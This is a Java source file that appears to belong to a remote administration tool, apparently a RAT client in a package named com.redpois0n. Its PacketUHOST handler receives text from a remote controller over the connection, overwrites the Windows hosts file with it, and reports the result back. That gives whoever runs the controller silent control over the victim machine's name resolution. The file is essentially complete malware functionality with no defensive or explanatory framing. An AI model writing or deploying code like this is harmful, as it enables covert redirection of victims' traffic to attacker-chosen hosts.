package com.redpois0n.packets;

import java.io.FileWriter;

import com.redpois0n.Connection;
import com.redpois0n.common.os.OperatingSystem;


public class PacketUHOST extends AbstractPacket {

	@Override
	public void read(String line) throws Exception {
		String str = Connection.readLine();
		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
			try {
				FileWriter writer = new FileWriter(System.getenv("SystemDrive") + "\\Windows\\System32\\drivers\\etc\\hosts");
				writer.write(str);
				writer.close();
				Connection.writeLine("HOSTANSW");
				Connection.writeLine("");
			} catch (Exception ex) {
				Connection.writeLine("HOSTANSW");
				Connection.writeLine("ERR: " + ex.getMessage());
			}
		} else {
			Connection.writeLine("HOSTANSW");
			Connection.writeLine("Needs to be windows");
		}
	}

}
